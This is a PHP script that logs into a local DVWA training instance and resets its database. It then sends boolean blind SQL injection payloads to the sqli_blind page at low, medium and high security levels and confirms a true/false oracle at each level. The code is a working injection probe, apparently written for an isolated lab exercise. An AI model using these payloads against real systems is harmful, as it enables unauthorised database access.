<?php

declare(strict_types=1);

$base = 'http://127.0.0.1';
$user = getenv('DVWA_LAB_USER') ?: '';
$password = getenv('DVWA_LAB_PASSWORD') ?: '';
if ($user === '' || $password === '') {
    fwrite(STDERR, "Set sandbox-only DVWA_LAB_USER and DVWA_LAB_PASSWORD.\n");
    exit(2);
}

function requestPage($c, string $url, ?array $fields = null): array
{
    curl_setopt($c, CURLOPT_URL, $url);
    curl_setopt($c, CURLOPT_POST, $fields !== null);
    curl_setopt($c, CURLOPT_POSTFIELDS, $fields === null ? null : http_build_query($fields));
    $body = curl_exec($c);
    if ($body === false) {
        throw new RuntimeException('HTTP request failed: ' . curl_error($c));
    }
    return [$body, (int)curl_getinfo($c, CURLINFO_HTTP_CODE), (string)curl_getinfo($c, CURLINFO_EFFECTIVE_URL)];
}

function userToken(string $body): string
{
    if (!preg_match('/<input\\b[^>]*name=[\'\"]user_token[\'\"][^>]*value=[\'\"]([^\'\"]+)/i', $body, $m)) {
        throw new RuntimeException('user_token not found');
    }
    return html_entity_decode($m[1], ENT_QUOTES | ENT_HTML5, 'UTF-8');
}

function loginSession(string $base, string $user, string $password): string
{
    $jar = tempnam(sys_get_temp_dir(), 'dvwa-blind-login-');
    $c = curl_init();
    curl_setopt_array($c, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 3,
        CURLOPT_CONNECTTIMEOUT => 4,
        CURLOPT_TIMEOUT => 15,
        CURLOPT_COOKIEFILE => $jar,
        CURLOPT_COOKIEJAR => $jar,
        CURLOPT_USERAGENT => 'DVWA-isolated-blind-test/1.0',
    ]);
    try {
        [$page] = requestPage($c, $base . '/login.php');
        [$body, $status, $url] = requestPage($c, $base . '/login.php', [
            'username' => $user,
            'password' => $password,
            'Login' => 'Login',
            'user_token' => userToken($page),
        ]);
        if ($status !== 200 || stripos($body, 'Login failed') !== false || str_contains($url, 'login.php')) {
            throw new RuntimeException('Sandbox login failed; SQLi probes not sent');
        }
        foreach (curl_getinfo($c, CURLINFO_COOKIELIST) ?: [] as $line) {
            $parts = explode("\t", $line);
            if (count($parts) >= 7 && $parts[5] === 'PHPSESSID' && preg_match('/^[A-Za-z0-9,-]+$/', $parts[6])) {
                return $parts[6];
            }
        }
        throw new RuntimeException('Authenticated session cookie not found');
    } finally {
        @unlink($jar);
    }
}

function probe(string $base, string $sessionId, string $level, string $truth): array
{
    $cookie = 'PHPSESSID=' . $sessionId . '; security=' . $level;
    if ($level === 'high') {
        $cookie .= '; id=' . $truth;
        $url = $base . '/vulnerabilities/sqli_blind/';
    } elseif ($level === 'low') {
        $url = $base . '/vulnerabilities/sqli_blind/?' . http_build_query(['id' => $truth, 'Submit' => 'Submit']);
    } else {
        $url = $base . '/vulnerabilities/sqli_blind/';
    }
    $c = curl_init($url);
    curl_setopt_array($c, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 3,
        CURLOPT_CONNECTTIMEOUT => 4,
        CURLOPT_TIMEOUT => 15,
        CURLOPT_COOKIE => $cookie,
        CURLOPT_USERAGENT => 'DVWA-isolated-blind-test/1.0',
    ]);
    if ($level === 'medium') {
        curl_setopt($c, CURLOPT_POST, true);
        curl_setopt($c, CURLOPT_POSTFIELDS, http_build_query(['id' => $truth, 'Submit' => 'Submit']));
    }
    if ($level === 'low') {
        curl_setopt($c, CURLOPT_HTTPGET, true);
    }
    $body = curl_exec($c);
    if ($body === false) {
        throw new RuntimeException(strtoupper($level) . ' probe failed: ' . curl_error($c));
    }
    $status = (int)curl_getinfo($c, CURLINFO_HTTP_CODE);
    return [$body, $status];
}

$jar = tempnam(sys_get_temp_dir(), 'dvwa-blind-setup-');
$c = curl_init();
curl_setopt_array($c, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_MAXREDIRS => 3,
    CURLOPT_CONNECTTIMEOUT => 4,
    CURLOPT_TIMEOUT => 15,
    CURLOPT_COOKIEFILE => $jar,
    CURLOPT_COOKIEJAR => $jar,
    CURLOPT_USERAGENT => 'DVWA-isolated-blind-test/1.0',
]);
try {
    [$setupPage] = requestPage($c, $base . '/setup.php');
    [, $setupStatus] = requestPage($c, $base . '/setup.php', [
        'create_db' => 'Create / Reset Database',
        'user_token' => userToken($setupPage),
    ]);
    if ($setupStatus !== 200) {
        throw new RuntimeException('Sandbox DB initialization failed');
    }
    echo "isolated database initialized\n";
} finally {
    @unlink($jar);
}

$sessionId = loginSession($base, $user, $password);
$cases = [
    'low' => ["1' AND '1'='1", "1' AND '1'='2"],
    'medium' => ['1 OR 1=1', '1 AND 1=2'],
    'high' => ["1'OR'1'='1", "1'AND'1'='2"],
];
foreach ($cases as $level => [$trueInput, $falseInput]) {
    [$trueBody, $trueStatus] = probe($base, $sessionId, $level, $trueInput);
    [$falseBody, $falseStatus] = probe($base, $sessionId, $level, $falseInput);
    $trueSignal = strpos($trueBody, 'User ID exists in the database.') !== false;
    $falseSignal = strpos($falseBody, 'User ID is MISSING from the database.') !== false;
    echo strtoupper($level) . " true={$trueStatus}/" . ($trueSignal ? 'exists' : 'no-exists-marker')
        . " false={$falseStatus}/" . ($falseSignal ? 'missing' : 'no-missing-marker') . "\n";
    if (!$trueSignal || !$falseSignal) {
        throw new RuntimeException(strtoupper($level) . ' boolean oracle acceptance criteria not met');
    }
    echo strtoupper($level) . "_BOOLEAN_ORACLE_CONFIRMED\n";
}
